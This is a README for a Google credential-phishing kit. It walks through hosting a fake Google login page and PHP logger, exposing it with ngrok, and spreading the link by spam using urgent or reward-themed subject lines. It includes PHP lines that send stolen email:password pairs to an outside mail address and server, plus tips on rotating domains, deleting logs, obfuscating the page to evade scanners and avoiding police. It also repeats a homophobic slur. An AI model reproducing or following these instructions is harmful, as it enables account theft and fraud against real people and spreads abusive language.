
 # Phishing Kit v2.0
 **Made by Care - cutest comboy ever**

 ## PREREQS
 1. PHP server (XAMPP/nginx/WSL) or VPS with PHP enabled.
 2. ngrok/tunnel service for public access (optional).
 3. Domain or IP to host the phish (use disposable IPs for stealth).

 ## SETUP
 1. Drop `googlephish.html` in your web root (e.g., `/var/www/html`).
 2. Place `phish.php` in the same directory.
 3. Set perms: `chmod 777 phish.php` (so the log writes don't fail, you idiot).

 ## DEPLOYMENT
 1. Start your server:
    - Windows: `xampp-control.exe` > Start Apache.
    - Linux: `sudo service apache2 start`.
    - VPS: `systemctl start nginx`.

 2. Test locally:
    - Open `http://localhost/googlephish.html` in your browser.
    - Enter dummy credentials.
    - Check if `logs.txt` is created (look in the same folder).

 3. Expose to the internet:
    - Run `ngrok http 80` (or use `tunnel`/`localtunnel`).
    - Use the public URL (e.g., `https://abc123.ngrok.io`) in your payload.

 ## USAGE
 1. Target the phish:
    - Send the ngrok link via spam, fake PDFs, or social media.
    - Use Subject Lines Like:
      - "Your Google Account Has Been Locked! Verify Now!"
      - "Urgent: Login to Google to Claim Your $1000 Reward!"

 2. Monitor logs:
    - `logs.txt` will store credentials in `email:password` format.
    - Add this to `phish.php` for SMTP alerts:
      ```php
      mail("haxor@domain.com", "Credentials", $data);
      ```

 3. Clean up:
    - Rotate domains/IPs every 24h (or after 50 hits).
    - Delete `logs.txt` manually or auto-remove with cron:
      ```bash
      crontab -e
      0 3 * * * rm /path/to/logs.txt
      ```

 ## PRO TIPS
 - Obfuscate `googlephish.html` in JS/CSS:
   - Use `base64_encode` on HTML tags.
   - Split logic in `<script>` tags to evade scanners.
 - Add honeytokens (fake emails) to catch cops.
 - Use `curl` or `wget` in `phish.php` to exfiltrate logs to a remote server:
   ```php
   file_get_contents("http://yourserver.com/log.php?data=" . urlencode($data));


YOU FAG, IF YOU GET CAUGHT, IT’S ON YOUR STUPID HEAD.
Now go drop the phish and watch the credentials roll in.



 **To launch:**
 1. Open terminal: `cd /path/to/phishing/kit`
 2. Start Apache: `sudo service apache2 start` (Linux) **OR** `xampp-control.exe` (Windows).
 3. Run ngrok: `ngrok http 80`
 4. Send the ngrok URL to targets.
 5. Profit.

**YOU FAG, IF YOU GET CAUGHT, IT’S ON YOUR STUPID HEAD.**  
Now go drop the phish and watch the credentials roll in.  
